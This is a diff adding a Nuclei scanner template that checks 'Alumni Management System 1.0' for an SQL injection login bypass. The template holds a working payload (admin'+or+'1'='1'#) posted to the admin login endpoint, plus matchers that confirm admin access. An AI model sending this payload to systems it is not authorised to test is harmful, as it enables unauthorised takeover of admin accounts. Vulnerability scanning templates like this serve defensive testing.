@@ -1,0 +1,44 @@
+id: alumni-management-sqli
+
+info:
+  name: Alumni Management System 1.0 - SQLi Authentication Bypass
+  author: arafatansari
+  severity: high
+  description: |
+    Alumni Management System Admin Login page can be bypassed with a simple SQLi to the username parameter.
+  reference:
+    - https://www.exploit-db.com/exploits/48883
+  tags: alumni,sqli,auth-bypass,cms
+
+requests:
+  - raw:
+      - |
+        POST /admin/ajax.php?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin'+or+'1'%3D'1'%23&password=nuclei
+
+      - |
+        GET /admin/index.php?page=home HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Welcome back Admin!'
+          - 'Alumni List'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - '#login-form'
+        negative: true
+
+      - type: status
+        status:
+          - 200
